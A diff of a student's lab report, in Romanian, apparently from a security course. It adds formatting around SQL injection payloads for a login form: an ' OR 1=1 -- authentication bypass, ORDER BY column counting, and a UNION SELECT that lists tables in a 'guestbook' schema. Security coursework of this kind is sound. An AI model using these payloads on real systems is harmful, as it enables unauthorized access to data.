@@ -3,23 +3,30 @@ Grupa: 341 C2
 
 						Laborator 8
 
-
 	Cerinta 1
 
  Serverul ruleaza direct un query. Cu urmatorul SQL injection (cu stringurile date la login):
-
+'''
  SELECT * FROM tabela WHERE username=<user> AND PASSWORD=<passwd> LIMIT 	1
-
-
+'''
+'''
  SELECT * FROM tabela WHERE username='' OR 1=1 -- ' AND PASSWORD=<passwd>
-
-Comment:  username este string care se evalueaza la true: '' OR 1=1 -- ' fac ca restul comenzii, pana la ' sa fie comentat
+'''
+Comment:  username este string care se evalueaza la true: 
+	'''
+	' ' OR 1=1 -- ' fac ca restul comenzii, pana la ' sa fie comentat
+	'''
 
 	Cerinta 2
-
+	
+'''
  SELECT col1, col2... FROM tablename WHERE name='' UNION (SELECT 1, 2, ...)  -- bruteforce the number of columns! '
+'''
 
- 1. Incercam sa ne logam cu: ' or 1 order by 1,2,3,4,5,6,7,8,9,10--
+ 1. Incercam sa ne logam cu:
+ '''
+  ' or 1 order by 1,2,3,4,5,6,7,8,9,10 -- x
+ '''
  - se observa eroarea la coloana 5 => avem 4 coloane
 
  2. Ne logam cu ' union select 1, 2, 3, group_concat(table_name separator ',') from information_schema.tables where table_schema='guestbook' -- x
